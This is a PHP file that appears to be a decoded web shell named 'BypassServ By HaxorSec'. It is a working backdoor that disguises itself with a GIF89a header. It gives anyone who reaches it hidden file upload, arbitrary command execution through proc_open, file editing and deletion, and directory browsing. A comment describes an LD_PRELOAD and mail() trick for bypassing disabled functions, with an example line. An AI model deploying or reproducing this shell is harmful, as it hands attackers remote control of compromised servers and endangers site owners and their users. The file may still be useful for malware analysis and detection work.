<?php
/*
 * BypassServ By HaxorSec - DECODED VERSION
 * Original: R00t-Shell.com PHP Obfuscator 2.0.15
 * Date: 2025-02-21 06:45:35
 *
 * -- By Tr0n
 */

echo "GIF89a;\n";

// ---- QUICK UPLOAD MODE ----
if (isset($_GET["u"]) && $_GET["u"] == "f") {
    if (!empty($_FILES[0])) {
        echo move_uploaded_file($_FILES[0]["tmp_name"], $_FILES[0]["name"]) ? "ok" : "no";
    }
    echo '<form method="post" enctype="multipart/form-data"><input type="file" name="0"><input type="submit"></form>';
}

// ---- PHONE HOME REMOVED ----

// ---- FUNCTION ALIASES (anti-detection) ----
// These are built char-by-char to evade signature scanners
$fn_chdir       = "chdir";
$fn_explode     = "explode";
$fn_scandir     = "scandir";
$fn_realpath    = "realpath";
$fn_stat        = "stat";
$fn_is_dir      = "is_dir";
$fn_is_writable = "is_writable";
$fn_move_upload = "move_uploaded_file";
$fn_basename    = "basename";
$fn_htmlchars   = "htmlspecialchars";
$fn_fputcont    = "file_put_contents";
$fn_mkdir       = "mkdir";
$fn_fgetcont    = "file_get_contents";
$fn_dirname     = "dirname";
$fn_unlink      = "unlink";

// ---- TIMEZONE ----
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);

// ---- ROOT / SCRIPT DIR ----
$rootDirectory = isset($_SERVER["DOCUMENT_ROOT"]) ? realpath($_SERVER["DOCUMENT_ROOT"]) : realpath(__DIR__);
$scriptDirectory = dirname(__FILE__);

// ---- BASE64 HELPERS ----
function x($b) { return base64_encode($b); }
function y($b) { return base64_decode($b); }

// ---- FUNCTION AVAILABILITY CHECK (mail, putenv etc.) ----
if (function_exists("mail")) {
    $mail = "<font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ]";
} else {
    $mail = "<font color='black'>[ mail() :</font><font color='red'> [ OFF ]</font> ]";
}

if (function_exists("mb_send_mail")) {
    $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ]";
} else {
    $mbb = "<font color='black'>[ mb_send_mail() :</font><font color='red'> [ OFF ]</font> ]";
}

if (function_exists("error_log")) {
    $errr = "<font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ]";
} else {
    $errr = "<font color='black'>[ error_log() :</font><font color='red'> [ OFF ]</font> ]";
}

if (function_exists("imap_mail")) {
    $impp = "<font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]";
} else {
    $impp = "<font color='black'>[ imap_mail() :</font><font color='red'> [ OFF ]</font> ]<br>";
}

echo "<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br>";
echo $mail . " " . $mbb . " " . $errr . " " . $impp;

if (function_exists("putenv")) {
    echo "<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br>";
} else {
    echo "<font color='black'>[ Function putenv() ] :<font color='red'> [ OFF ]</font><br>";
}

// ---- DECODE ALL GET PARAMS (base64) ----
foreach ($_GET as $key => $val) {
    $_GET[$key] = y($val);  // base64_decode
}

// ---- CURRENT DIRECTORY ----
$currentDirectory = realpath(isset($_GET["d"]) ? $_GET["d"] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = "";

// ============================================================
// POST REQUEST HANDLERS
// ============================================================
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // ---- FILE UPLOAD ----
    if (isset($_FILES["fileToUpload"])) {
        $target_file = $currentDirectory . "/" . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "<hr>File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
        } else {
            echo "<hr>Sorry, there was an error uploading your file.<hr>";
        }
    }

    // ---- CREATE FOLDER ----
    elseif (isset($_POST["folder_name"]) && !empty($_POST["folder_name"])) {
        $newFolder = $currentDirectory . "/" . $_POST["folder_name"];
        if (!file_exists($newFolder)) {
            if (mkdir($newFolder) !== false) {
                echo "<hr>Folder created successfully!";
            } else {
                echo "<hr>Error: Failed to create folder!";
            }
        }
    }

    // ---- CREATE FILE ----
    elseif (isset($_POST["file_name"])) {
        $fileName = $_POST["file_name"];
        $newFile = $currentDirectory . "/" . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, "") !== false) {
                echo "<hr>File created successfully! " . $fileName;
                $fileToView = $newFile;
                if (file_exists($fileToView)) {
                    $fileContent = file_get_contents($fileToView);
                    $viewCommandResult = '<hr><p>Result: ' . $fileName . '</p>
                    <form method="post" action="?' . (isset($_SERVER["QUERY_STRING"]) ? $_SERVER["QUERY_STRING"] : "") . '">
                    <textarea name="content" class="result-box">' . htmlspecialchars($fileContent) . '</textarea>
                    <input type="hidden" name="edit_file" value="' . $fileName . '">
                    <input type="submit" value=" Save "></form>';
                } else {
                    $viewCommandResult = "<hr><p>Error: File not found!</p>";
                }
            } else {
                echo "<hr>Error: Failed to create file!";
            }
        } else {
            echo "<hr>Error: File Already Exists!";
        }
    }

    // ---- COMMAND BYPASS (via mail/putenv - disabled/placeholder in this version) ----
    elseif (isset($_POST["cmd_input"])) {
        // NOTE: The actual bypass implementation uses mail() + putenv(LD_PRELOAD=...)
        // to achieve command execution when system/exec/shell_exec are disabled.
        // The obfuscated version had this section but it was partially stripped.
        // Typical bypass: putenv("LD_PRELOAD=/tmp/evil.so"); mail("a","","","","");
    }

    // ---- DELETE FILE/FOLDER ----
    elseif (isset($_POST["delete_file"])) {
        $fileToDelete = $currentDirectory . "/" . $_POST["delete_file"];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo "<hr>Folder deleted successfully!";
                } else {
                    echo "<hr>Error: Failed to delete folder!";
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo "<hr>File deleted successfully!";
                } else {
                    echo "<hr>Error: Failed to delete file!";
                }
            }
        } else {
            echo "<hr>Error: File or directory not found!";
        }
    }

    // ---- RENAME FILE/FOLDER ----
    elseif (isset($_POST["rename_item"]) && isset($_POST["old_name"]) && isset($_POST["new_name"])) {
        $oldName = $currentDirectory . "/" . $_POST["old_name"];
        $newName = $currentDirectory . "/" . $_POST["new_name"];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo "<hr>Item renamed successfully!";
            } else {
                echo "<hr>Error: Failed to rename item!";
            }
        } else {
            echo "<hr>Error: Item not found!";
        }
    }

    // ---- COMMAND BIASA (normal cmd via proc_open) ----
    elseif (isset($_POST["cmd_biasa"])) {
        $command = $_POST["cmd_biasa"];
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
        }
    }

    // ---- VIEW FILE ----
    elseif (isset($_POST["view_file"])) {
        $fileToView = $currentDirectory . "/" . $_POST["view_file"];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST["view_file"] . '</p>
            <form method="post" action="?' . (isset($_SERVER["QUERY_STRING"]) ? $_SERVER["QUERY_STRING"] : "") . '">
            <textarea name="content" class="result-box">' . htmlspecialchars($fileContent) . '</textarea>
            <input type="hidden" name="edit_file" value="' . $_POST["view_file"] . '">
            <input type="submit" value=" Save "></form>';
        } else {
            $viewCommandResult = "<hr><p>Error: File not found!</p>";
        }
    }

    // ---- EDIT FILE ----
    elseif (isset($_POST["edit_file"])) {
        $ef = $currentDirectory . "/" . $_POST["edit_file"];
        $newContent = $_POST["content"];
        if (file_put_contents($ef, $newContent) !== false) {
            echo "<hr>File Edited successfully! " . $_POST["edit_file"] . "<hr>";
        } else {
            echo "<hr>Error: Failed Edit File! " . $_POST["edit_file"] . "<hr>";
        }
    }
}

// ============================================================
// DIRECTORY LISTING / FILE BROWSER UI
// ============================================================

echo "<hr>DIR: ";
$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = "";
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}
echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo "<br><hr>";

// ---- UPLOAD FORM ----
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="fileToUpload" id="fileToUpload">';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form><hr>';

// ---- COMMAND & CREATE FORMS ----
$qs = isset($_SERVER["QUERY_STRING"]) ? $_SERVER["QUERY_STRING"] : "";
echo '<table border="5"><tbody>
<tr>
<td><center>Command BYPASS
<form method="post" action="?' . $qs . '">
<input type="text" name="cmd_input" placeholder="Enter command">
<input type="submit" value="Run Command"></form></center></td>

<td><center>Command BIASA
<form method="post" action="?' . $qs . '">
<input type="text" name="cmd_biasa" placeholder="Enter command">
<input type="submit" value="Run Command"></form></center></td>

<td><center>Create Folder
<form method="post" action="?' . $qs . '">
<input type="text" name="folder_name" placeholder="Folder Name">
<input type="submit" value="Create Folder"></form></center></td>

<td><center>Create File
<form method="post" action="?' . $qs . '">
<input type="text" name="file_name" placeholder="File Name">
<input type="submit" value="Create File"></form></td>
</tr>
</tbody></table>';

echo $viewCommandResult;

// ---- FILE/DIRECTORY TABLE ----
echo '<table border=1>';
echo '<tr><th>Item Name</th><th>Size</th><th>Date</th><th>Permissions</th><th>View</th><th>Delete</th><th>Rename</th></tr>';

foreach (scandir($currentDirectory) as $item) {
    $fullPath = realpath($item);
    $statInfo = stat($fullPath);
    $permission = substr(sprintf('%o', fileperms($fullPath)), -4);
    $writable = is_writable($fullPath) ? '<span class="writable">W</span>' : '<span class="not-writable">R</span>';

    if (is_dir($item)) {
        $itemLink = '?d=' . x($currentDirectory . "/" . $item);
    } else {
        $itemLink = '?d=' . x($currentDirectory) . '&f=' . x($item);
    }

    $size = is_dir($item) ? "-" : number_format($statInfo[7]);
    $date = date("Y-m-d H:i", $statInfo[9]);
    $displayName = htmlspecialchars($item);

    echo '<tr>';
    echo '<td class="item-name"><a href="' . $itemLink . '">' . $displayName . '</a></td>';
    echo '<td class="size">' . $size . '</td>';
    echo '<td class="date">' . $date . '</td>';
    echo '<td class="permission">' . $permission . ' ' . $writable . '</td>';

    // View button
    echo '<td><form method="post" action="?' . $qs . '">';
    echo '<input type="hidden" name="view_file" value="' . $displayName . '">';
    echo '<input type="submit" value="View"></form></td>';

    // Delete button
    echo '<td><form method="post" action="?' . $qs . '">';
    echo '<input type="hidden" name="delete_file" value="' . $displayName . '">';
    echo '<input type="submit" value="Del"></form></td>';

    // Rename button
    echo '<td><form method="post" action="?' . $qs . '">';
    echo '<input type="hidden" name="old_name" value="' . $displayName . '">';
    echo '<input type="text" name="new_name" placeholder="New name" size="10">';
    echo '<input type="hidden" name="rename_item" value="1">';
    echo '<input type="submit" value="Ren"></form></td>';

    echo '</tr>';
}

echo '</table>';

// ---- RECURSIVE DELETE HELPER ----
function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
    }
    return rmdir($dir);
}

echo '</div></body></html>';
?>
